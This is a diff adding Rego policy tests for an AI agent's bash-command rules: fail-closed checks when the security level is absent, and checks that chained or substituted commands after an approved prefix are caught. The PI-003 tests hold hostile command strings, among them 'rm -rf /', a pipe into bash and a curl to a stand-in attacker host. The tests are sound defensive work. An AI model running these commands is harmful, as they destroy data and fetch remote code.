@@ -57,6 +57,20 @@ test_pi001_violation_level_l1 {
     count([v | v := result[_]; v.rule == "PI-001"]) > 0
 }
 
+test_pi001_violation_missing_bash_security_level {
+    # level := input.pi_agent.bash_security_level previously went undefined
+    # (no violation) when the field was absent entirely — must fail closed.
+    result := bash.violation with input as {
+        "pi_agent": {"bash_commands": []},
+    }
+    count([v | v := result[_]; v.rule == "PI-001"]) > 0
+}
+
+test_pi001_violation_empty_input {
+    result := bash.violation with input as {}
+    count([v | v := result[_]; v.rule == "PI-001"]) > 0
+}
+
 # ---------------------------------------------------------------------------
 # PI-002 — No unrestricted bash tool access (L1/L2/L3)
 # ---------------------------------------------------------------------------
@@ -184,6 +198,42 @@ test_pi003_pass_exact_pytest {
         },
     }
     count([v | v := result[_]; v.rule == "PI-003"]) == 0
+}
+
+test_pi003_violation_chained_command_after_approved_prefix {
+    # command_is_approved matches by startswith(), so "echo " + anything was
+    # previously accepted — chaining an unapproved command after an approved
+    # prefix must now be caught by the metacharacter check.
+    result := bash.violation with input as {
+        "pi_agent": {
+            "bash_security_level": "L4",
+            "bash_commands": ["echo ok && rm -rf /"],
+
+        },
+    }
+    count([v | v := result[_]; v.rule == "PI-003"]) > 0
+}
+
+test_pi003_violation_pipe_to_unapproved_command {
+    result := bash.violation with input as {
+        "pi_agent": {
+            "bash_security_level": "L4",
+            "bash_commands": ["cat file.txt | bash"],
+
+        },
+    }
+    count([v | v := result[_]; v.rule == "PI-003"]) > 0
+}
+
+test_pi003_violation_command_substitution {
+    result := bash.violation with input as {
+        "pi_agent": {
+            "bash_security_level": "L4",
+            "bash_commands": ["echo $(curl http://evil.example/x)"],
+
+        },
+    }
+    count([v | v := result[_]; v.rule == "PI-003"]) > 0
 }
 
 # ---------------------------------------------------------------------------
